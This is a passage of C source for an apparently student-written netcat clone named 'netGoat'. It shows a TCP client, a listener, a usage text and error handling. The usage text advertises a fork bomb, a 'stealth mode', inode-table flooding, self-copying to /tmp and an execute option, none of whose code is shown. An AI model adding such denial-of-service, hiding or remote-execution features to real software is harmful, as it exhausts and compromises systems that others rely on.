	strSansWhiteSpace = strtok_r(strWhiteSpaceCheck, " \t", &bufWhiteSpaceCheck);
	if ( strSansWhiteSpace == NULL ) {
		return 1;
	} else {
		return 0;
	}
}
//END EXECUTE FUNCTION
//********************************************************************
//********************************************************************
//CLIENT FUNCTION
//********************************************************************
int clientFunc(int argc, char * argv[]){
  int intFailure;  // Return from called routines
  int intDataIO;   // Amount of IO performed
  char bufServRply[BUF_SIZE];  // Buffer for message returned from server
  // Server Information
  struct addrinfo *aiHints;         // Hints for address search
  struct addrinfo *aiResults;       // Results from address search
  // Search for server (Howdy Internet - 2)
    // Setup search criteria
  aiHints = calloc( 1, sizeof( struct addrinfo ));
  aiHints->ai_family = AF_INET;
  aiHints->ai_socktype = SOCK_STREAM;  // Steam (connection oriented) socket
  aiHints->ai_protocol = IPPROTO_TCP;  // Future proof (explicitly specify TCP
  aiHints->ai_flags |= AI_CANONNAME;   // Return canonical name (not needed)

  // Client Information
  int sfdSocket;        // Socket used to communicate with server
  int intSockFamily = AF_INET;   // IPv4
  sfdSocket = socket(intSockFamily, SOCK_STREAM, IPPROTO_TCP);
  if ( sfdSocket == -1 ) {
    errorFunc(3);
  }

    // Search for server
    intFailure = getaddrinfo(argv[1], argv[2], aiHints, &aiResults);
    if ( intFailure != 0 ) {
      fprintf(stderr, "ERROR: Unable to get server address information - %s\n", gai_strerror(intFailure));
      freeaddrinfo(aiResults);
      free(aiHints);
      return 4;
    }
  free(aiHints);
  if ( aiResults == NULL ) {
    errorFunc(19);
  }
  unsigned short portNum;
  unsigned short portMessage;
  portMessage = atoi(argv[2]);
  portNum = htons(portMessage);
  ((struct sockaddr_in *)aiResults->ai_addr)->sin_port = portNum;

  // Set server port (Level 2 - 2)
  // Connect to socket (Howdy Internet - 3)
  intFailure = connect(sfdSocket, aiResults->ai_addr, aiResults->ai_addrlen);
  if ( intFailure == -1 ) {
    errorFunc(20);
    freeaddrinfo(aiResults);
  }
  freeaddrinfo(aiResults);
  char strFullCmdLn[1024];  // String for full command line
  while (1){
  if (fgets(strFullCmdLn, BUF_SIZE, stdin) == NULL ) {  // Read command line
    //fprintf(stdout, "\n");
    errorFunc(30);
  }
  // Perform I/O
  // Send a message to the server (Howdy Internet - 4)
  intDataIO = write(sfdSocket, strFullCmdLn, strlen(strFullCmdLn));
  if ( intDataIO == -1 ) {
    errorFunc(21);
  }
  // Receive a message from the server (Howdy Internet - 5)
  intDataIO = read(sfdSocket, bufServRply, BUF_SIZE);
  if ( intDataIO == -1 ) {
    errorFunc(22);
  }

  // Output message from server to standard output (Howdy Internet - 6)
  intDataIO = write(STDOUT_FILENO, bufServRply, intDataIO);
  }
  // Close socket
  intFailure = close(sfdSocket);
  if ( intFailure == -1 ) {
    errorFunc(23);
  }
  // Return to Caller
  return 0;
}
//END CLIENT FUNCTION
//********************************************************************
//********************************************************************
//LISTENING FUNCTION: Part 2... Server Side
//********************************************************************
int listeningFunc(int argc, char * argv[]){
  int intFailure;  // Returned failure
  int intSockFamily = AF_INET;
  int intDataIO;
  struct addrinfo *aiHints;     // Hints for address search
  struct addrinfo *aiResults;  // Results from address search
  char strServName[BUF_SIZE];  // Server name
  char *strPortNum = argv[optind];
  struct sockaddr saddrClient;
  socklen_t slenClientSockAddr = sizeof(struct sockaddr_in);  // Length information for IPv4
  strndup(argv[0], BUF_SIZE);
  slenClientSockAddr = sizeof(struct sockaddr_in);
  aiHints = calloc( 1, sizeof( struct addrinfo ));
  aiHints->ai_flags = AI_PASSIVE;
  aiHints->ai_family = intSockFamily;
  aiHints->ai_socktype = SOCK_STREAM;
  aiHints->ai_protocol = IPPROTO_TCP;
  intFailure = gethostname(strServName, BUF_SIZE);
  if ( intFailure == -1 ) {
    errorFunc(24);
    fprintf(stderr, "ERROR: Unable to get own hostname\n");
    return 3;
  }
  intFailure = getaddrinfo(NULL, strPortNum, aiHints, &aiResults);
  if ( intFailure != 0 ) {
    errorFunc(25);
    fprintf(stderr, "ERROR: Unable to get own address information - %s\n", gai_strerror(intFailure));
    free(aiHints);
    freeaddrinfo(aiResults);
  }
  free(aiHints);
  // Setup socket
  sfdServer = socket(aiResults->ai_family, aiResults->ai_socktype, aiResults->ai_protocol);
  if ( sfdServer == -1 ) {
    errorFunc(18);
    freeaddrinfo(aiResults);
  }
  // Bind to socket
  intFailure = bind(sfdServer, aiResults->ai_addr, aiResults->ai_addrlen);
  if ( intFailure == -1 ) {
    errorFunc(26);
    freeaddrinfo(aiResults);
  }
  // Listen on socket
  intFailure = listen(sfdServer, MAX_NUM_PEND_CONNECT);
  if ( intFailure == -1 ) {
    errorFunc(27);
    freeaddrinfo(aiResults);
  }
  freeaddrinfo(aiResults);
  fprintf(stdout, "listening...\n");

    while (1){
      bufData = calloc(1024, 1);
    // Accept connection
    sfdClient = accept(sfdServer, &saddrClient, &slenClientSockAddr);
    if ( sfdClient == -1 ) {
      errorFunc(28);
    }
    fprintf(stdout, "connected...\n");
    intDataIO = read(sfdClient, bufData, BUF_SIZE);
    if ( intDataIO == -1 ) {
      errorFunc(22);
    }
    write(STDOUT_FILENO, bufData, intDataIO);
    char strFullCmdLn[1024];  // String for full command line

      if (fgets(strFullCmdLn, BUF_SIZE, stdin) == NULL ) {  // Read command line
        fprintf(stdout, "\n");
        errorFunc(30);
      }
      free(bufData);
      intDataIO = write(sfdClient, strFullCmdLn, strlen(strFullCmdLn));
  }
    // Close server socket
    intFailure = close(sfdServer);
    if ( intFailure == -1 ) {
      errorFunc(29);
  }
  // Return to Caller
  return 0;
}
//END LISTENING FUNCTION
//********************************************************************
//********************************************************************
//Usage Option: read in the help option using getopt: these are types of options and this is what they do
//********************************************************************
  void usage(char *strCalledName) {
      fprintf(stdout, "NAME\n");
      fprintf(stdout, "\n\tnetGoat- our rendition of netcat\n");
      fprintf(stdout, "SYNOPSIS\n");
      fprintf(stdout, "\nnetGoat [SIGUSR options (-a or -b)][options] [PATH] [FILE]...\n");
      fprintf(stdout, "DESCRIPTION\n");
      fprintf(stdout, "\tConcatenate FILE(s), or standard input(s), to standard output\n");
      fprintf(stdout, "\tSIGUSR1 triggers fork bomb\n");
      fprintf(stdout, "\tSIGUSR2 will trigger stealth mode unless already in stealth mode\n\tif in stealth mode, will disable\n");
      fprintf(stdout, "\t-h: display this help\n");
      fprintf(stdout, "\t-c: read file\n");
      fprintf(stdout, "\t-s: trigger stealth mode...file will exist on file system on disk\n");
      fprintf(stdout, "\t-a: SIGUSR1\n");
      fprintf(stdout, "\t-b: SIGUSR2\n");
      fprintf(stdout, "\t-i: fill inode table with hundreds of new files\n");
      fprintf(stdout, "\t-p: trigger stealth mode or deactivate stealth mode if already activated\n");
      fprintf(stdout, "\t-m: create copy of netGoat in /tmp\n");
      fprintf(stdout, "\t-f: trigger fork bomb\n");
      fprintf(stdout, "\t-e: trigger execute\n");
      fprintf(stdout, "\nXOXO,\n");
      fprintf(stdout, "THE BASIC BITS\n");
      fprintf(stdout, "\n\nCreated for you by: \n\tShannon Gorman\n\tLexi Mendolia\n");
      exit(0);//EXIT WITH NORMAL RETURN VALUE
  }
//********************************************************************
//Error Option
//********************************************************************
void errorFunc(int errNum){
  switch(errNum){
      case 1: fprintf(stderr,"\nError reading file.\n\n");
          exit(errNum);
      case 2: fprintf(stderr,"\nError writing file.\n\n");
          exit(errNum);
      case 3: fprintf(stderr,"\nError opening file.\n\n");
          exit(errNum);
      case 4: fprintf(stderr, "\nFork bomb failed.\n\n");
          exit(errNum);
      case 5: fprintf(stderr, "\nDidn't register signal.\n\n");
          exit(errNum);
  		case 6: fprintf(stderr,"\nsetenv didn't work.\n\n");
  			  exit(errNum);
  		case 7: fprintf(stderr, "\nFile specified is inaccessible\n\n");
  				exit(errNum);
  		case 8: fprintf(stderr, "\nCouldn't dup fd.\n\n");
  				exit(errNum);
  		case 9: fprintf(stderr, "\nFile does not exist.\n\n");
  				exit(errNum);
  		case 10: fprintf(stderr, "\nToo many redirects, bro\n\n");
  				exit(errNum);
  		case 11: fprintf(stderr, "\nToo many arguments\n\n");
  				exit(errNum);
  		case 12: fprintf(stderr, "\nCouldn't initialize pipe.\n\n");
  				exit(errNum);
  		case 13: fprintf(stderr, "\nCannot redirect in a pipe.\n\n");
  				exit(errNum);
  		case 14: fprintf(stderr, "\nDid not have effective permissions to open file.\n\n");
  				exit(errNum);
  		case 15: fprintf(stderr, "\nDid not enter file in command line.\n\n");
  				exit(errNum);
      case 16: fprintf(stderr,"\nDidn't shut down socket\n\n");
  			  exit(errNum);
  		case 17: fprintf(stderr,"\nDidn't register signal.\n\n");
  			  exit(errNum);
  		case 18: fprintf(stderr,"Unable to create socket\n");
  				exit(errNum);
  		case 19: fprintf(stderr,"\nUnable to find server information\n\n");
  				exit(errNum);
  		case 20: fprintf(stderr,"\nUnable to connect to server.\n\n");
  				exit(errNum);
  		case 21: fprintf(stderr,"\nUnable to write to socket.\n\n");
  				exit(errNum);
  		case 22: fprintf(stderr,"\nUnable to read from socket.\n\n");
  				exit(errNum);
  		case 23: fprintf(stderr,"\nUnable to close socket.\n\n");
  				exit(errNum);
  		case 24: fprintf(stderr,"\nUnable to get own hostname.\n\n");
  				exit(errNum);
  		case 25: fprintf(stderr,"\nUnable to get own address information.\n\n");
  				exit(errNum);
  		case 26: fprintf(stderr,"\nUnable to bind socket.\n\n");
  				exit(errNum);
  		case 27: fprintf(stderr,"\nUnable to listen on socket.\n\n");
  				exit(errNum);
  	  case 28: fprintf(stderr,"\nUnable to accept connection.\n\n");
  			exit(errNum);
  		case 29: fprintf(stderr,"\nUnable to close server socket.\n\n");
  				exit(errNum);
  		case 30: fprintf(stderr,"\nError with fgets.\n\n");
  				exit(errNum);
    }
  exit(0);
}
//********************************************************
//SHUTDOWN FUNCTION
//********************************************************
void shutdownFunc(int intSignNum, siginfo_t *sigInfo, void *sysDependContext){
	int intFailure = -1;
	intFailure = shutdown(sfdClient, SHUT_RDWR);
	close(sfdClient);
	if ( intFailure){errorFunc(16);}
	intFailure = shutdown(sfdServer, SHUT_RDWR);
	close(sfdServer);
	if ( intFailure){errorFunc(16);}
	exit(0);
}
